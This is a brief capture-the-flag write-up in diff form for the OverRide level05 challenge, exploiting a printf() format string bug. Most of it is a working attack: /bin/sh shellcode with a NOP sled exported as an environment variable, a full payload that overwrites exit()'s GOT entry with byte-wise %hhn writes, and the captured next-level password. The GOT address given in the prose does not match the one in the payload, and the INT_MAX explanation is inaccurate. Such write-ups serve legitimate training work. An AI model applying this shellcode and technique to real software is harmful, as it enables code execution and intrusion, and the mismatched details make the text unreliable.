@@ -1,0 +1,21 @@
+The program use fgets to read a buffer
+
+Here the vulnerability resides in the printf() call
+as user can set the format string to read data from the stack
+This is a Format String Attack
+
+we will use a SHELLCODE in environment variable
+
+level05@OverRide:~$> export SHELLCODE=`python -c "print  '\x90' *100000 + '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"`
+
+exit() located at [0x8048370] jump to what it's stored in [0x804970e] inside the GOT
+
+So if we overwrite the GOT address to redirect the real glibc exit() to function our SHELLCODE [0xffff0000]
+
+but since we need to write more than INT_MAX byte to perform the Format String Attack
+we'll separate each bytes to replace the exit address in the GOT
+
+level05@OverRide:~$> (python -c 'print "\xe0\x97\x04\x08" + "\xe1\x97\x04\x08" + "\xe2\x97\x04\x08" + "\xe3\x97\x04\x08" + "%252x" + "%10$hhn" + "%244x" + "%11$hhn" + "%255x" + "%12$hhn" + "%256x" + "%13$hhn" ';cat) | ./level05
+
+level06@OverRide:~$> cat ~level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
